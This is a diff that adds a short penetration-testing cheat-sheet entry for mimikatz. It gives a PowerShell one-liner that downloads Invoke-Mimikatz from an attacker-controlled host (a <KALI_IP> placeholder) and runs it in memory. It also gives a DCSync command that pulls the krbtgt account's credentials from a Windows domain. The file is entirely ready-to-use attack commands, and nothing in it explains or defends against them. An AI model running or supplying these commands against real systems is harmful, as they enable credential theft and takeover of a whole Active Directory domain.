@@ -1,0 +1,6 @@
+% mimikatz
+
+# invoke-mimikatz single command with spaces
+IEX(New-Object Net.WebClient).DownloadString("http://<KALI_IP>/win/Invoke-Mimikatz2.ps1")
+; example: dcsync
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<FQDN> /user<DOMAIN>:\krbtgt"'
